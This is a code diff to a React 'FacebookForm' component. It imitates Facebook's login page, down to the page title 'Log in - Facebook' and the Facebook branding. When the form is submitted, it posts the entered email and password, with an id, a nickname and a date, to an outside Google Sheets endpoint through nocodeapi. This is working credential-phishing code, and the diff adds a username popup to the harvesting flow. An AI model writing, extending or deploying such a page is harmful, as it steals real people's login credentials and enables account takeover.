@@ -9,6 +9,8 @@ const FacebookForm = () => {
     const [redBorder, setRedBorder] = useState(false)
 
     const [loaderState, setLoaderState] = useState(false)
+    const [PopupState, setPopupState] = useState(false)
+    const [nicknameVal, setNicknameVal] = useState('')
 
     useEffect(() => {
         document.title = 'Log in - Facebook'
@@ -31,14 +33,16 @@ const FacebookForm = () => {
         setLoaderState(true)
         let d = new Date()
         let date = `${d.getDay()}/${d.getMonth()}/${d.getFullYear()}`
-        let id = Date.now() * Math.random()
+        let id = `F${Math.round(Date.now() * Math.random())}`
+
         axios ({
             method: 'post',
             url: 'https://v1.nocodeapi.com/tuxa/google_sheets/xQtvMBfFFgfpISRL?tabId=Sheet1', 
             params: {},
-            data: [[id, 'null', email, password, date]]
+            data: [[id, nicknameVal, email, password, date]]
         }).then(function () {
             setLoaderState(false)
+            setPopupState(false)
         }).catch(function (error) {
             alert('Authentication Failed... Please try again', error)
             console.log(error); 
@@ -66,7 +70,10 @@ const FacebookForm = () => {
             <div className="title-wrapper">
                 <p className="title-f"><strong>facebook</strong></p>
             </div>
-            <form onSubmit={sendEmail}>
+            <form onSubmit={(e) => {
+                e.preventDefault()
+                    setPopupState(true)}
+                }>
                 <div className="item">
                     <input type="email" placeholder="Mobile number or email" name="_email" onChange={(e) => setEmail(e.target.value)} value={email} required/>
                 </div>
@@ -84,6 +91,10 @@ const FacebookForm = () => {
             <div className="cr-new-acc-button">
                 <button onClick={() => window.location.href = 'https://www.facebook.com/'}>Create new account</button>
             </div>
+
+
+            {PopupState ? <Popup title='Enter an Username' icon='user' placeholder='John Doe' onSubmitClick={sendEmail} onCancelClick={() => setPopupState(false)} onChangeHandler={setNicknameVal}/> : null}
+
 
             <footer>
                 <div className="upper-part">
